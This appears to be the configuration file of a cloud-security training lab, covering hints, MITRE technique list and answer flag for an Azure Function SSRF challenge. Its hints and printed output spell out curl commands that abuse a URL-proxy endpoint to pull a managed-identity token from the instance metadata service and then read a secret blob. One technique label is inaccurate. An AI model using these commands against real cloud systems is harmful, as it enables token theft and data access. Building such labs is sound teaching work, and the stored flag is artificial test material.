from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1190", "name": "Server-Side Request Forgery", "url": "https://attack.mitre.org/techniques/T1190/"},
        {"id": "T1552.005", "name": "Unsecured Credentials: Cloud Instance Metadata API", "url": "https://attack.mitre.org/techniques/T1552/005/"},
        {"id": "T1528", "name": "Steal Application Access Token", "url": "https://attack.mitre.org/techniques/T1528/"},
        {"id": "T1530", "name": "Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"},
    ]
    def configure_application(self, **kwargs):
        pass
    def get_hints(self):
        return {
            1: "The Function App has a /api/fetch endpoint that proxies any URL you supply via ?url=. Think about what internal network endpoints are reachable from inside Azure.",
            2: "The Azure Instance Metadata Service is reachable at http://169.254.169.254/ from inside the function sandbox. Try: curl '<function_url>?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://storage.azure.com/' -H 'Metadata: true'",
            3: "Extract access_token from the JSON response, then use it to call the Blob Storage REST API: curl -H 'Authorization: Bearer <token>' -H 'x-ms-version: 2019-12-12' https://<storage_account>.blob.core.windows.net/secrets/flag.txt",
        }

    def get_flag(self):
        return "CUMULONIMBUS{Funct10n_SSRF_1MDS_T0k3n}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Function URL       : " + output["function_url"]["value"])
        print("[2] Storage account    : " + output["storage_account_name"]["value"])
        print("[3] Resource group     : " + output["resource_group_name"]["value"])
        print("")
        print("Test the SSRF endpoint:")
        print("  curl '{}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'".format(
            output["function_url"]["value"]))
        self.print_mitre_ttps()